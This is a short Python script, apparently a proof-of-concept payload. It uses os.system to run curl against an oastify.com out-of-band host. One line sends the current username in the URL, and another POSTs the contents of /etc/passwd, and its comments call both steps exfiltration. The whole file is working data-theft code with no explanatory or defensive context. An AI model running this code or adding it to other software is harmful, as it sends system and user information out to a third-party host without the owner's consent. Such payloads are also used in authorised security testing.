
import os
# Exfiltrate current user
os.system("curl http://go8x3nq7vdeq29y69shghbj6jxpydo1d.oastify.com/$(whoami)")

# Read and exfiltrate /etc/passwd (LFI-style)
os.system("curl -X POST --data-binary '@/etc/passwd' http://go8x3nq7vdeq29y69shghbj6jxpydo1d.oastify.com/$(whoami)")
